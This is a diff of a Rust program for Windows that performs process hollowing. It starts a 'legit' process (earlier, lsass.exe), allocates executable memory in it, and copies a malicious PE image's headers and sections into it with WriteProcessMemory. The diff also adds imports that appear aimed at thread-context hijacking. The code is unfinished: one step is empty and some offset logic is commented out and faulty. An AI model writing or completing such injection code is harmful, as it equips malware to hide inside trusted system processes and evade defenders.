@@ -14,6 +14,7 @@ use std::str::from_utf8;
 use std::string::String;
 use std::ffi::CString;
 use std::mem;
+use std::mem::size_of;
 use std::convert::*;
 
 extern crate subprocess;
@@ -28,7 +29,7 @@ use std::iter::once;
 use std::os::windows::ffi::OsStrExt;
 use std::ptr::null_mut;
 use winapi::um::winuser::{MB_OK, MessageBoxW};
-use winapi::um::winbase::{CREATE_SUSPENDED, DETACHED_PROCESS, CREATE_NEW_PROCESS_GROUP};
+use winapi::um::winbase::{CREATE_SUSPENDED, DETACHED_PROCESS, CREATE_NEW_PROCESS_GROUP, LPCONTEXT};
 use winapi::um::libloaderapi::{GetModuleHandleW, GetProcAddress};
 use winapi::um::processthreadsapi::{CreateProcessW, LPPROCESS_INFORMATION, PROCESS_INFORMATION, STARTUPINFOW};
 //use winapi::shared::ntdef::FALSE;
@@ -37,7 +38,7 @@ use winapi::shared::basetsd::{SIZE_T};
 use winapi::shared::winerror::{HRESULT_FROM_WIN32};
 use winapi::um::memoryapi::{VirtualFreeEx, VirtualAllocEx, WriteProcessMemory};
 use winapi::um::errhandlingapi::{GetLastError};
-use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, MEM_RELEASE, PAGE_EXECUTE_READWRITE};
+use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, MEM_RELEASE, PAGE_EXECUTE_READWRITE, CONTEXT};
 use winapi::ctypes::c_void;
 
 
@@ -49,7 +50,7 @@ use byteorder::{ByteOrder, BigEndian, LittleEndian};
 
 extern crate pelite;
 use pelite::pe64::{Pe, PeFile};
-use pelite::image::IMAGE_DOS_HEADER;
+use pelite::image::{IMAGE_DOS_HEADER, IMAGE_SECTION_HEADER, IMAGE_NT_HEADERS64};
 
 struct ProcessData {
 	pidh : u8,
@@ -114,7 +115,7 @@ fn main() {
 	startup_info.cb = mem::size_of::<STARTUPINFOW>() as DWORD;
 	
 	
-	let mut mal_proc = unsafe { 
+	let mut legit_proc = unsafe { 
 						CreateProcessW (null_mut(),
 										legit_path.as_mut_ptr(),
 										//mal_path.as_mut_ptr(),
@@ -127,7 +128,7 @@ fn main() {
 										&mut startup_info, &mut proc_info)						
 							};
 	
-	let mut legit_proc = Exec::shell("C:\\windows\\system32\\lsass.exe").detached();
+	//let mut legit_proc = Exec::shell("C:\\windows\\system32\\lsass.exe").detached();
 	//legit_proc.popen();
 	
 	
@@ -205,13 +206,13 @@ fn main() {
 				GetLastError()
 	};
 	
-	//Part 4
+	//Part 5
 	let write_res = unsafe {
 						WriteProcessMemory (
 							proc_info.hProcess,
-							(mal_img_base + u64::from(section_head[0].VirtualAddress)) as LPVOID,
-							mal_buf[(section_head[0].PointerToRawData) as usize] as LPVOID,
-							section_head[0].SizeOfRawData as SIZE_T,
+							nt_head.OptionalHeader.ImageBase as LPVOID,
+							mal_buf[0] as LPVOID,
+							nt_head.OptionalHeader.SizeOfHeaders as SIZE_T,
 							null_mut()
 							)
 					};
@@ -222,6 +223,46 @@ fn main() {
 	};
 
 	
+	//Part 6
+	for i in 0..nt_head.FileHeader.NumberOfSections {
+		/*
+		//let mut offset = dos_head.e_lfanew + size_of::<IMAGE_NT_HEADERS64>() + size_of::<IMAGE_SECTION_HEADER>() * i;
+		let struct_size = size_of::<IMAGE_NT_HEADERS64>() + size_of::<IMAGE_SECTION_HEADER>();
+		let e_lfanew_size = dos_head.e_lfanew as usize;
+		let offset = (struct_size + e_lfanew_size) * (i as usize);
+		
+		//let mut index : usize = mal_buf[offset as usize] as usize;
+		*/
+		let mut index = i as usize;
+		
+		let mut write_res = unsafe {
+							WriteProcessMemory (
+								proc_info.hProcess,
+								(mal_img_base + u64::from(section_head[index].VirtualAddress)) as LPVOID,
+								mal_buf[(section_head[index].PointerToRawData) as usize] as LPVOID,
+								section_head[index].SizeOfRawData as SIZE_T,
+								//section_head[index].SizeOfHeaders as SIZE_T,
+								null_mut()
+							)
+						};
+		/*
+		let mut write_res = unsafe {
+							WriteProcessMemory (
+								proc_info.hProcess,
+								(mal_img_base + u64::from(section_head[0].VirtualAddress)) as LPVOID,
+								mal_buf[(section_head[0].PointerToRawData) as usize] as LPVOID,
+								//section_head[0].SizeOfRawData as SIZE_T,
+								section_head[0].SizeOfHeaders as SIZE_T,
+								null_mut()
+							)
+						};
+		*/
+		println!("write_res: {:?}\n", write_res);
+	};
+	
+	
+	//Part 7
+	
 	
 	
 	
@@ -229,7 +270,7 @@ fn main() {
 	
 	println!("legit_proc:\n{:?}\n", legit_proc);
 	
-	println!("mal_proc:\n{:?}\n", mal_proc);
+	//println!("mal_proc:\n{:?}\n", mal_proc);
 	
 	println!("mod_handle_str:\n{:?}\n", mod_handle_str);
 	
